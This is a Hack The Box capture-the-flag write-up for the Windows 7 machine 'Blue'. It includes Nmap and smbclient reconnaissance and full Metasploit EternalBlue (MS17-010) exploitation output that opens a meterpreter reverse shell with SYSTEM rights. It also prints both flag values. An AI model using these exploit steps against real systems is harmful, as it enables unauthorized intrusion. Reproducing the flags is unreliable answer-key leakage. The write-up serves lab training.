---
title: 'Blue'
date: '2026-09-03'
excerpt: 'Easy - Windows'
prog: 'Hack The Box Machines - September 2026'
type: 'machines'
---

<div class="writeup-header">
<div class="writeup-header-text">
<div class="writeup-org">Hack The Box</div>
<h1 class="writeup-title">Blue</h1>
<div class="writeup-date">September 2026 &middot; Machines</div>
</div>
</div>
<p class="lead mb-4">Blue, while possibly the most simple machine on Hack The Box, demonstrates the severity of the EternalBlue exploit, which has been used in multiple large-scale ransomware and crypto-mining attacks since it was leaked publicly.</p>

<h4 class="mb-3">Tasks</h4>
<p class="mb-2"><strong>Question 1:</strong> How many open TCP ports are listening on Blue? Don't include any 5-digit ports.</p>
<p class="mb-3">Run a Nmap scan using <code>nmap -sC -sV -A [TARGET_IP]</code> in the terminal.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-qsj7vwkp11-htb-cloud-com]─[~]
└──╼ [★]$ nmap -sC -sV -A 10.129.16.42
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-03 07:46 EDT
Nmap scan report for 10.129.16.42
Host is up (0.45s latency).
Not shown: 991 closed tcp ports (conn-refused)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -1d00h16m07s, deviation: 34m34s, median: -23h56m09s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-09-02T12:52:17+01:00
| smb2-time: 
|   date: 2026-09-02T11:52:14
|_  start_date: 2026-09-02T11:48:51
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 144.11 seconds
```

<p class="mb-5"><strong>Answer:</strong> 3</p>
<br />


<p class="mb-2"><strong>Question 2:</strong> What is the hostname of Blue?</p>
<p class="mb-5"><strong>Answer:</strong> haris-PC</p>
<br />


<p class="mb-2"><strong>Question 3:</strong> What operating system is running on the target machine? Give a two-word answer with a name and high-level version.</p>
<p class="mb-5"><strong>Answer:</strong> Windows 7</p>
<br />


<p class="mb-2"><strong>Question 4:</strong> How many SMB shares are available on Blue?</p>
<p class="mb-3">We list the SMB shares anonymously using <code>smbclient -L //[TARGET_IP] -N</code>.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-qsj7vwkp11-htb-cloud-com]─[~]
└──╼ [★]$ smbclient -L //10.129.16.42 -N

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	Share           Disk      
	Users           Disk      
SMB1 disabled -- no workgroup available
```

<p class="mb-5"><strong>Answer:</strong> 5</p>
<br />


<p class="mb-2"><strong>Question 5:</strong> What 2017 Microsoft Security Bulletin number describes a remote code execution vulnerability in SMB?</p>
<p class="mb-5"><strong>Answer:</strong> MS17-010</p>
<br />


<p class="mb-2"><strong>Question 6:</strong> Optional question: A worm was set loose on the internet in May 2017 propagating primarily through MS17-010. What is the famous name for that malware?</p>
<p class="mb-5"><strong>Answer:</strong> WannaCry</p>
<br />


<p class="mb-2"><strong>Question 7:</strong> What user do you get execution with when exploiting MS17-010? Include the full name, including anything before a .</p>
<p class="mb-3">We use Metasploit to gain RCE on the target machine. We use <code>exploit/windows/smb/ms17_010_eternalblue</code> and set the RHOSTS and LHOST correctly.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-qsj7vwkp11-htb-cloud-com]─[~]
└──╼ [★]$ msfconsole -q
[msf](Jobs:0 Agents:0) >> search eternalblue

Matching Modules
================

   #   Name                                           Disclosure Date  Rank     Check  Description
   -   ----                                           ---------------  ----     -----  -----------
   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1     \_ target: Automatic Target                  .                .        .      .
   2     \_ target: Windows 7                         .                .        .      .
   3     \_ target: Windows Embedded Standard 7       .                .        .      .
   4     \_ target: Windows Server 2008 R2            .                .        .      .
   5     \_ target: Windows 8                         .                .        .      .
   6     \_ target: Windows 8.1                       .                .        .      .
   7     \_ target: Windows Server 2012               .                .        .      .
   8     \_ target: Windows 10 Pro                    .                .        .      .
   9     \_ target: Windows 10 Enterprise Evaluation  .                .        .      .
   10  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   11    \_ target: Automatic                         .                .        .      .
   12    \_ target: PowerShell                        .                .        .      .
   13    \_ target: Native upload                     .                .        .      .
   14    \_ target: MOF upload                        .                .        .      .
   15    \_ AKA: ETERNALSYNERGY                       .                .        .      .
   16    \_ AKA: ETERNALROMANCE                       .                .        .      .
   17    \_ AKA: ETERNALCHAMPION                      .                .        .      .
   18    \_ AKA: ETERNALBLUE                          .                .        .      .
   19  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   20    \_ AKA: ETERNALSYNERGY                       .                .        .      .
   21    \_ AKA: ETERNALROMANCE                       .                .        .      .
   22    \_ AKA: ETERNALCHAMPION                      .                .        .      .
   23    \_ AKA: ETERNALBLUE                          .                .        .      .
   24  auxiliary/scanner/smb/smb_ms17_010             .                normal   No     MS17-010 SMB RCE Detection
   25    \_ AKA: DOUBLEPULSAR                         .                .        .      .
   26    \_ AKA: ETERNALBLUE                          .                .        .      .
   27  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
   28    \_ target: Execute payload (x64)             .                .        .      .
   29    \_ target: Neutralize implant                .                .        .      .


Interact with a module by name or index. For example info 29, use 29 or use exploit/windows/smb/smb_doublepulsar_rce
After interacting with a module you can manually set a TARGET with set TARGET 'Neutralize implant'

[msf](Jobs:0 Agents:0) >> use 0
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) >> show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7,
                                              Windows Embedded Standard 7 target machines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Win
                                             dows Embedded Standard 7 target machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embed
                                             ded Standard 7 target machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     148.113.54.69    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



View the full module info with the info, or info -d command.

[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) >> set RHOSTS 10.129.16.42
RHOSTS => 10.129.16.42
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) >> set LHOST 10.10.14.224
LHOST => 10.10.14.224
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) >> check
[*] 10.129.16.42:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.129.16.42:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.25/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator '+' and '?' was replaced with '*' in regular expression
[*] 10.129.16.42:445      - Scanned 1 of 1 hosts (100% complete)
[+] 10.129.16.42:445 - The target is vulnerable.
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) >> exploit
[*] Started reverse TCP handler on 10.10.14.224:4444 
[*] 10.129.16.42:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.129.16.42:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.129.16.42:445      - Scanned 1 of 1 hosts (100% complete)
[+] 10.129.16.42:445 - The target is vulnerable.
[*] 10.129.16.42:445 - Connecting to target for exploitation.
[+] 10.129.16.42:445 - Connection established for exploitation.
[+] 10.129.16.42:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.129.16.42:445 - CORE raw buffer dump (42 bytes)
[*] 10.129.16.42:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.129.16.42:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.129.16.42:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.129.16.42:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.129.16.42:445 - Trying exploit with 12 Groom Allocations.
[*] 10.129.16.42:445 - Sending all but last fragment of exploit packet
[*] 10.129.16.42:445 - Starting non-paged pool grooming
[+] 10.129.16.42:445 - Sending SMBv2 buffers
[+] 10.129.16.42:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.129.16.42:445 - Sending final SMBv2 buffers.
[*] 10.129.16.42:445 - Sending last fragment of exploit packet!
[*] 10.129.16.42:445 - Receiving response from exploit packet
[+] 10.129.16.42:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.129.16.42:445 - Sending egg to corrupted connection.
[*] 10.129.16.42:445 - Triggering free of corrupted buffer.
[-] 10.129.16.42:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 10.129.16.42:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=FAIL-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 10.129.16.42:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] 10.129.16.42:445 - Connecting to target for exploitation.
[+] 10.129.16.42:445 - Connection established for exploitation.
[+] 10.129.16.42:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.129.16.42:445 - CORE raw buffer dump (42 bytes)
[*] 10.129.16.42:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.129.16.42:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.129.16.42:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.129.16.42:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.129.16.42:445 - Trying exploit with 17 Groom Allocations.
[*] 10.129.16.42:445 - Sending all but last fragment of exploit packet
[*] 10.129.16.42:445 - Starting non-paged pool grooming
[+] 10.129.16.42:445 - Sending SMBv2 buffers
[+] 10.129.16.42:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.129.16.42:445 - Sending final SMBv2 buffers.
[*] 10.129.16.42:445 - Sending last fragment of exploit packet!
[*] 10.129.16.42:445 - Receiving response from exploit packet
[+] 10.129.16.42:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.129.16.42:445 - Sending egg to corrupted connection.
[*] 10.129.16.42:445 - Triggering free of corrupted buffer.
[*] Sending stage (232006 bytes) to 10.129.16.42
[+] 10.129.16.42:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.129.16.42:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.129.16.42:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] Meterpreter session 1 opened (10.10.14.224:4444 -> 10.129.16.42:49161) at 2026-09-03 08:15:35 -0400

(Meterpreter 1)(C:\Windows\system32) > whoami
[-] Unknown command: whoami. Run the help command for more details.
(Meterpreter 1)(C:\Windows\system32) > shell
Process 700 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

<p class="mb-5"><strong>Answer:</strong> nt authority\system</p>
<br />


<p class="mb-2"><strong>Question 8:</strong> Submit the flag located on the haris user's desktop.</p>
<p class="mb-3">Find the user folder for haris and read the flag in the desktop.</p>

```console
C:\Windows\System32>cd ..\.. && dir
cd ..\.. && dir
 Volume in drive C has no label.
 Volume Serial Number is BE92-053B

 Directory of C:\

14/07/2009  04:20    <DIR>          PerfLogs
18/02/2022  16:02    <DIR>          Program Files
14/07/2017  17:58    <DIR>          Program Files (x86)
14/07/2017  14:48    <DIR>          Share
21/07/2017  07:56    <DIR>          Users
02/09/2026  12:56    <DIR>          Windows
               0 File(s)              0 bytes
               6 Dir(s)   2,689,871,872 bytes free

C:\>cd Users && dir
cd Users && dir
 Volume in drive C has no label.
 Volume Serial Number is BE92-053B

 Directory of C:\Users

21/07/2017  07:56    <DIR>          .
21/07/2017  07:56    <DIR>          ..
21/07/2017  07:56    <DIR>          Administrator
14/07/2017  14:45    <DIR>          haris
12/04/2011  08:51    <DIR>          Public
               0 File(s)              0 bytes
               5 Dir(s)   2,689,871,872 bytes free

C:\Users>cd haris && dir
cd haris && dir
 Volume in drive C has no label.
 Volume Serial Number is BE92-053B

 Directory of C:\Users\haris

14/07/2017  14:45    <DIR>          .
14/07/2017  14:45    <DIR>          ..
15/07/2017  08:58    <DIR>          Contacts
24/12/2017  03:23    <DIR>          Desktop
15/07/2017  08:58    <DIR>          Documents
15/07/2017  08:58    <DIR>          Downloads
15/07/2017  08:58    <DIR>          Favorites
15/07/2017  08:58    <DIR>          Links
15/07/2017  08:58    <DIR>          Music
15/07/2017  08:58    <DIR>          Pictures
15/07/2017  08:58    <DIR>          Saved Games
15/07/2017  08:58    <DIR>          Searches
15/07/2017  08:58    <DIR>          Videos
               0 File(s)              0 bytes
              13 Dir(s)   2,689,871,872 bytes free

C:\Users\haris>cd Desktop && dir
cd Desktop && dir
 Volume in drive C has no label.
 Volume Serial Number is BE92-053B

 Directory of C:\Users\haris\Desktop

24/12/2017  03:23    <DIR>          .
24/12/2017  03:23    <DIR>          ..
02/09/2026  12:49                34 user.txt
               1 File(s)             34 bytes
               2 Dir(s)   2,689,871,872 bytes free

C:\Users\haris\Desktop>type user.txt
type user.txt
b26f2d04cad8e10c675468ea2a275940
```

<p class="mb-3"></p>
<p class="mb-5"><strong>Answer:</strong> b26f2d04cad8e10c675468ea2a275940</p>
<br />


<p class="mb-2"><strong>Question 9:</strong> Submit the flag located on the administrator's desktop.</p>
<p class="mb-3">Navigate to the admin Desktop's folder and read the flag.</p>

```console
C:\Users\haris\Desktop>cd ..\..\Administrator && dir
cd ..\..\Administrator && dir
 Volume in drive C has no label.
 Volume Serial Number is BE92-053B

 Directory of C:\Users\Administrator

21/07/2017  07:56    <DIR>          .
21/07/2017  07:56    <DIR>          ..
21/07/2017  07:56    <DIR>          Contacts
24/12/2017  03:22    <DIR>          Desktop
21/07/2017  07:56    <DIR>          Documents
18/02/2022  16:21    <DIR>          Downloads
21/07/2017  07:56    <DIR>          Favorites
21/07/2017  07:56    <DIR>          Links
21/07/2017  07:56    <DIR>          Music
21/07/2017  07:56    <DIR>          Pictures
21/07/2017  07:56    <DIR>          Saved Games
21/07/2017  07:56    <DIR>          Searches
21/07/2017  07:56    <DIR>          Videos
               0 File(s)              0 bytes
              13 Dir(s)   2,689,871,872 bytes free

C:\Users\Administrator>cd Desktop && dir
cd Desktop && dir
 Volume in drive C has no label.
 Volume Serial Number is BE92-053B

 Directory of C:\Users\Administrator\Desktop

24/12/2017  03:22    <DIR>          .
24/12/2017  03:22    <DIR>          ..
02/09/2026  12:49                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   2,689,871,872 bytes free

C:\Users\Administrator\Desktop>type root.txt
type root.txt
f04d67d163c05e67df7fece68cc6ee42
```

<p class="mb-5"><strong>Answer:</strong> f04d67d163c05e67df7fece68cc6ee42</p>


<hr />
<section class="text-center" style="margin-top:1.5rem; margin-bottom:1.5rem;">
<p class="mb-1" style="font-style:italic; font-size:1.125rem;">See you in the next Hacking Lab.</p>
<p class="mb-0" style="font-weight:700;">@aaronamran</p>
<p class="text-muted small mt-1">September 2026</p>
</section>

<div class="writeup-nav">
</div>
</div>